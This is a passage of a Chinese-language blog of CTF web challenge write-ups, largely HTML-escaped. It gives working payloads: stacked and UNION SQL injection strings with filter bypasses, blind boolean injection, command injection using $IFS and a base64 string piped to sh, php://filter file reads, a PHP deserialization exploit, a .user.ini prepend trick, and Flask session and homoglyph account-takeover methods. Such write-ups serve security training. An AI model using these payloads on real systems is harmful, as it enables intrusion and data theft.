&lt;li&gt;payload: &lt;code&gt;1&#39;;show databases #&lt;/code&gt; 拿到数据库名&lt;br&gt;
 array (1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(11) “ctftraining”&lt;br&gt;
}&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;array(1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(18) “information_schema”&lt;br&gt;
}&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(5) “mysql”&lt;br&gt;
}&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(18) “performance_schema”&lt;br&gt;
}&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(9) “supersqli”&lt;br&gt;
}&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(4) “test”&lt;br&gt;
}&lt;br&gt;
3.  &lt;code&gt;1&#39;; show tables from ctftraining #&lt;/code&gt; 拿到表名&lt;br&gt;
 array (1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(10) “FLAG_TABLE”&lt;br&gt;
}&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(4) “news”&lt;br&gt;
}&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(5) “users”&lt;br&gt;
}&lt;br&gt;
4.  &lt;code&gt;1&#39;;show columns from ctftraining.FLAG_TABLE #&lt;/code&gt; 发现不行，被过滤了？？&lt;br&gt;
5.  &lt;code&gt;1&#39;;show tables #&lt;/code&gt; 看到有两个表&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(16) “1919810931114514”&lt;br&gt;
}&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(5) “words”&lt;br&gt;
}&lt;br&gt;
 6. 分别查看 words 和 1919810931114514 里面有些什么&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1&#39;;show columns from words #&lt;/code&gt; :array(6) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(2) “id”&lt;br&gt;
[1]=&amp;gt;&lt;br&gt;
string(7) “int(10)”&lt;br&gt;
[2]=&amp;gt;&lt;br&gt;
string(2) “NO”&lt;br&gt;
[3]=&amp;gt;&lt;br&gt;
string(0) “”&lt;br&gt;
[4]=&amp;gt;&lt;br&gt;
NULL&lt;br&gt;
[5]=&amp;gt;&lt;br&gt;
string(0) “”&lt;br&gt;
}&lt;/p&gt;
&lt;p&gt;array(6) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(4) “data”&lt;br&gt;
[1]=&amp;gt;&lt;br&gt;
string(11) “varchar(20)”&lt;br&gt;
[2]=&amp;gt;&lt;br&gt;
string(2) “NO”&lt;br&gt;
[3]=&amp;gt;&lt;br&gt;
string(0) “”&lt;br&gt;
[4]=&amp;gt;&lt;br&gt;
NULL&lt;br&gt;
[5]=&amp;gt;&lt;br&gt;
string(0) “”&lt;br&gt;
}&lt;br&gt;
 &lt;code&gt;1&#39;;show columns from &lt;/code&gt; 1919810931114514 &lt;code&gt; #&lt;/code&gt; （注意这里要加反引号）：array (6) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(4) “flag”&lt;br&gt;
[1]=&amp;gt;&lt;br&gt;
string(12) “varchar(100)”&lt;br&gt;
[2]=&amp;gt;&lt;br&gt;
string(2) “NO”&lt;br&gt;
[3]=&amp;gt;&lt;br&gt;
string(0) “”&lt;br&gt;
[4]=&amp;gt;&lt;br&gt;
NULL&lt;br&gt;
[5]=&amp;gt;&lt;br&gt;
string(0) “”&lt;br&gt;
} 看到了有 flag&lt;br&gt;
7. 接下来怎么读到 flag 就是关键了&lt;/p&gt;
&lt;figure class=&#34;highlight applescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs applescript&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&amp;#x27;; alter table &lt;span class=&#34;hljs-built_in&#34;&gt;words&lt;/span&gt; rename &lt;span class=&#34;hljs-keyword&#34;&gt;to&lt;/span&gt; words1;alter table `&lt;span class=&#34;hljs-number&#34;&gt;1919810931114514&lt;/span&gt;` rename &lt;span class=&#34;hljs-keyword&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;words&lt;/span&gt;;alter table &lt;span class=&#34;hljs-built_in&#34;&gt;words&lt;/span&gt; change flag &lt;span class=&#34;hljs-built_in&#34;&gt;id&lt;/span&gt; varchar(&lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt;);&lt;span class=&#34;hljs-comment&#34;&gt;#&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight applescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs applescript&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&amp;#x27;; alter table &lt;span class=&#34;hljs-built_in&#34;&gt;words&lt;/span&gt; rename &lt;span class=&#34;hljs-keyword&#34;&gt;to&lt;/span&gt; words1;alter table `&lt;span class=&#34;hljs-number&#34;&gt;1919810931114514&lt;/span&gt;` rename &lt;span class=&#34;hljs-keyword&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;words&lt;/span&gt;;alter table &lt;span class=&#34;hljs-built_in&#34;&gt;words&lt;/span&gt; add &lt;span class=&#34;hljs-built_in&#34;&gt;id&lt;/span&gt; int;a;ter table &lt;span class=&#34;hljs-built_in&#34;&gt;words&lt;/span&gt; alter &lt;span class=&#34;hljs-built_in&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; default &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后用 &lt;code&gt;1&#39;or 1=1 #&lt;/code&gt; 拿到 flag&lt;/p&gt;
&lt;p&gt;另 payload：&lt;/p&gt;
&lt;figure class=&#34;highlight smali&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs smali&#34;&gt;1&amp;#x27;;&lt;br&gt;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;&lt;br&gt;prepare execsql from @a;&lt;span class=&#34;hljs-built_in&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;execute &lt;/span&gt;execsql;&lt;span class=&#34;hljs-comment&#34;&gt;#&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;护网杯-2018easy_tornado&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#护网杯-2018easy_tornado&#34;&gt;#&lt;/a&gt; [护网杯 2018] easy_tornado&lt;/h2&gt;
&lt;p&gt;SSTI，handler.settings 拿 secret-cookie&lt;/p&gt;
&lt;h2 id=&#34;极客大挑战-2019easysql&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#极客大挑战-2019easysql&#34;&gt;#&lt;/a&gt; [极客大挑战 2019] EasySQL&lt;/h2&gt;
&lt;p&gt;万能密码直接拿 flag&lt;/p&gt;
&lt;h2 id=&#34;roarctf-2019easy-calc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#roarctf-2019easy-calc&#34;&gt;#&lt;/a&gt; [RoarCTF 2019]Easy Calc&lt;/h2&gt;
&lt;p&gt;查看源代码发现 /calc.php?num=，访问 calc.php 拿到源码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;error_reporting(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;num&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;br&gt;    show_source(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;num&amp;#x27;&lt;/span&gt;];&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$blacklist&lt;/span&gt; = [&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27; &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\t&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\r&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;quot;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;`&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\[&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\]&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\$&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\\&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\^&amp;#x27;&lt;/span&gt;];&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;foreach&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$blacklist&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$blackitem&lt;/span&gt;) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (preg_match(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$blackitem&lt;/span&gt; . &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/m&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt;)) &amp;#123;&lt;br&gt;                        &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;what are you want to do?&amp;quot;&lt;/span&gt;);&lt;br&gt;                &amp;#125;&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;echo &amp;#x27;&lt;/span&gt;.&lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt;.&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;;&amp;#x27;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt; &lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;php 的解析规则，当 php 进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析，也就是说我们只需要用 &lt;code&gt;? num=&lt;/code&gt;  就可以绕过 waf 的检测，但是这样只能绕过 waf 但是并不能绕过黑名单检测。用 chr (47) 绕过 &lt;code&gt;\&lt;/code&gt;  检测。&lt;/p&gt;
&lt;h2 id=&#34;hctf-2018admin&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hctf-2018admin&#34;&gt;#&lt;/a&gt; [HCTF 2018]admin&lt;/h2&gt;
&lt;p&gt;出题人 WP：“&lt;a href=&#34;https://www.ckj123.com/?p=147&#34;&gt;https://www.ckj123.com/?p=147&lt;/a&gt;”&lt;/p&gt;
&lt;p&gt;修改密码页面注释有 git 源码泄露，&lt;a href=&#34;https://github.com/woadsl1234/hctf_flask/%EF%BC%8C&#34;&gt;https://github.com/woadsl1234/hctf_flask/，&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;据说本题有多种解法，一是 flask 的 session 机制，session 泄露后解密出来，修改 name 的值为 admin 再用源码中的 secret-key 加密，就可以实现位置 admin。二是用到 Unicode 同形字引起的安全问题：&lt;/p&gt;
&lt;p&gt;spotify 任意用户密码修改漏洞](&lt;a href=&#34;https://labs.spotify.com/2013/06/18/creative-usernames/&#34;&gt;https://labs.spotify.com/2013/06/18/creative-usernames/&lt;/a&gt;)&lt;br&gt;
 漏洞简介:&lt;br&gt;
 找一个需要黑掉的账号，比如以 bigbird 为例。创建一个账户名为 ᴮᴵᴳᴮᴵᴿᴰ (in python this is the string u’\u1d2e\u1d35\u1d33\u1d2e\u1d35\u1d3f\u1d30′)。然后申请修改忘记密码，修改自己申请的账号密码。修改之后以刚刚设置的密码登录 bigbird。就可以成功登录。三是条件竞争。&lt;/p&gt;
&lt;h2 id=&#34;极客大挑战-2019secret-file&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#极客大挑战-2019secret-file&#34;&gt;#&lt;/a&gt; [极客大挑战 2019] Secret File&lt;/h2&gt;
&lt;p&gt;base64_decode(/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php)&lt;/p&gt;
&lt;h2 id=&#34;极客大挑战-2019lovesql&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#极客大挑战-2019lovesql&#34;&gt;#&lt;/a&gt; [极客大挑战 2019] LoveSQL&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;check.php?username=admin&amp;amp;password=-1&#39;/**/union/**/select/**/1,database(),database()/**/%23&lt;/code&gt;  拿到数据库名 =&amp;gt;‘geek’&lt;/p&gt;
&lt;p&gt;&lt;code&gt;check.php?username=admin&amp;amp;password=-1&#39;/**/union/**/select/**/1,2,(select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1)/**/%23&lt;/code&gt;  拿到表名 =&amp;gt;‘geekuser’,‘l0ve1ysq1’&lt;/p&gt;
&lt;p&gt;&lt;code&gt;check.php?username=admin&amp;amp;password=-1&#39;/**/union/**/select/**/1,2,(select/**/password/**/from/**/l0ve1ysq1/**/limit/**/15,1)/**/%23&lt;/code&gt;  拿到 flag=&amp;gt;‘flag {6d319459-bf52-4be1-8371-83d8d2b8a8d2}’&lt;/p&gt;
&lt;h2 id=&#34;极客大挑战-2019php&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#极客大挑战-2019php&#34;&gt;#&lt;/a&gt; [极客大挑战 2019] PHP&lt;/h2&gt;
&lt;p&gt;/www.zip 源码&lt;/p&gt;
&lt;p&gt;看源码是 PHP 反序列化&lt;/p&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Name&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$username&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;admin&amp;#x27;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Name;&lt;br&gt;var_dump(urlencode(serialize(&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;)));&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;极客大挑战-2019knife&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#极客大挑战-2019knife&#34;&gt;#&lt;/a&gt; [极客大挑战 2019] Knife&lt;/h2&gt;
&lt;p&gt;白给一句话&lt;/p&gt;
&lt;h2 id=&#34;极客大挑战-2019http&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#极客大挑战-2019http&#34;&gt;#&lt;/a&gt; [极客大挑战 2019] Http&lt;/h2&gt;
&lt;p&gt;/Secret.php&lt;/p&gt;
&lt;p&gt;改 Referer、UA、X-Forwarded-For&lt;/p&gt;
&lt;h2 id=&#34;suctf-2019checkin&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suctf-2019checkin&#34;&gt;#&lt;/a&gt; [SUCTF 2019]CheckIn&lt;/h2&gt;
&lt;p&gt;.user.ini(&lt;a href=&#34;https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html&#34;&gt;https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;主要利用就是在.user.ini 文件中写入： &lt;code&gt;auto_prepend_file=01.gif&lt;/code&gt; , 就会在目录下的 php 文件中自动包含 01.gif&lt;/p&gt;
&lt;h2 id=&#34;gxyctf2019ping-ping-ping&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gxyctf2019ping-ping-ping&#34;&gt;#&lt;/a&gt; [GXYCTF2019]Ping Ping Ping&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;利用；或者 | 可以执行命令&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;发现不能有空格，可以 $IFS 绕过，另外还有&lt;/p&gt;
&lt;figure class=&#34;highlight mel&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs mel&#34;&gt;&amp;lt; 、&amp;lt;&amp;gt;、%20(space)、%09(tab)、$IFS$9、 $&amp;#123;IFS&amp;#125;、$IFS、&amp;#123;cat,flag.php&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;不能出现 flag，通配符也不能用，只好直接全都读出来&lt;/p&gt;
&lt;figure class=&#34;highlight stata&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stata&#34;&gt;/?ip=127.0.0.1|&lt;span class=&#34;hljs-keyword&#34;&gt;cat&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$IFS&lt;/span&gt;`&lt;span class=&#34;hljs-keyword&#34;&gt;ls&lt;/span&gt;`&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;或者 &lt;code&gt;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;另外黑名单绕过还有以下这些方法&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;actf2020-新生赛include&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#actf2020-新生赛include&#34;&gt;#&lt;/a&gt; [ACTF2020 新生赛] Include&lt;/h2&gt;
&lt;p&gt;base64_decode(/?file=php://filter/convert.base64-encode/resource=flag.php)&lt;/p&gt;
&lt;h2 id=&#34;actf2020-新生赛backupfile&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#actf2020-新生赛backupfile&#34;&gt;#&lt;/a&gt; [ACTF2020 新生赛] BackupFile&lt;/h2&gt;
&lt;p&gt;常见备份文件 *.swp   *.bak&lt;/p&gt;
&lt;p&gt;访问 index.php.bak 拿到源码&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$key&lt;/span&gt; = intval(&lt;span class=&#34;hljs-variable&#34;&gt;$key&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&amp;quot;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$key&lt;/span&gt; == &lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt;) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$flag&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;index.php?key=123 拿到 flag&lt;/p&gt;
&lt;h2 id=&#34;ciscn2019-华北赛区-day2-web1hack-world&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ciscn2019-华北赛区-day2-web1hack-world&#34;&gt;#&lt;/a&gt; [CISCN2019 华北赛区 Day2 Web1] Hack World&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;题目提示是 SQL，单引号闭合没有用，双引号又被过滤了，猜测是数字型注入&lt;/li&gt;
&lt;li&gt;测试发现 0，1，2 返回结果不同，应该存在 bool 注入&lt;/li&gt;
&lt;li&gt;fuzz 一下测试过滤了哪些&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0^(ascii(substr((select(flag)from(flag)),1,1))&amp;gt;1)&lt;/code&gt; + &lt;code&gt;0^(ascii(substr((select(flag)from(flag)),1,1))&amp;gt;1000)&lt;/code&gt;  结果不同，盲注拿 flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;极客大挑战-2019babysql&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#极客大挑战-2019babysql&#34;&gt;#&lt;/a&gt; [极客大挑战 2019] BabySQL&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;|| 1=1 #&lt;/code&gt; 拿到 admin 密码：”667252cbf386409fcf10e06a81c1c19a“。登陆之后发现没啥用&lt;/li&gt;
&lt;li&gt;&lt;code&gt;password=1&#39;%20uniunionon%20seselectlect%201,2,3%23&lt;/code&gt;  测试可以注入&lt;/li&gt;
&lt;li&gt;&lt;code&gt;password=1&#39;%20uniunionon%20seselectlect%201,2,(seselectlect%20table_name%20frfromom%20infoorrmation_schema.tables%20whewherere%20table_schema=database()%20limit%200,1)%23&lt;/code&gt;  拿到表名 =&amp;gt;”b4bsql、geekuser“&lt;/li&gt;
&lt;li&gt;&lt;code&gt;password=1&#39;%20uniunionon%20seselectlect%201,2,(seleselectct%20column_name%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_name=&#39;b4bsql&#39;%20limit%200,1)%23 &lt;/code&gt; 拿到字段名 =&amp;gt;“id、username、password”&lt;/li&gt;
&lt;li&gt;&lt;code&gt;password=1&#39;%20uniunionon%20seselectlect%201,2,(seleselectct%20passwoorrd%20frfromom%20b4bsql%20limit%207,1)%23&lt;/code&gt;  拿到 flag&lt;/li&gt;
&lt;/ol&gt;
